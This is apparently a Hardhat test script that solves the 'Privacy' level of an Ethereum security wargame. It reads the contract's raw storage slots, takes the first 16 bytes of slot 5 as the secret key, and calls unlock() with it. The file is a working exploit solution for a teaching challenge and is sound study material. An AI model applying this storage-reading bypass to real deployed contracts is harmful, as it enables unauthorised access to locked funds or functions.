const { expect } = require("chai")
const { createChallenge, submitLevel } = require("./utils")

let s1, challenge, attacker, tx

before(async () => {
    ;[s1] = await ethers.getSigners()
    const challengeAddress = await createChallenge("0x131c3249e115491E83De375171767Af07906eA36")
    challenge = await ethers.getContractAt("Privacy", challengeAddress)
})

it("solves the challenge", async function () {
    for (let i = 0; i < 6; i++) {
        let value = await ethers.provider.getStorageAt(challenge.address, i)
        console.log(`Slot-${i} Hex value:\t ${value} --- BigInt value: ${BigInt(value)}`)
    }

    //locked = slot0, ID = slot1, flattening + denomination + awkwardness = slot2
    //data = slot3-slot5
    let data3 = await ethers.provider.getStorageAt(challenge.address, 5)
    let data3_16Bytes = data3.slice(0, 34) //we take 0x + first 16 bytes

    tx = await challenge.unlock(data3_16Bytes)
    await tx.wait()
})

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true
})
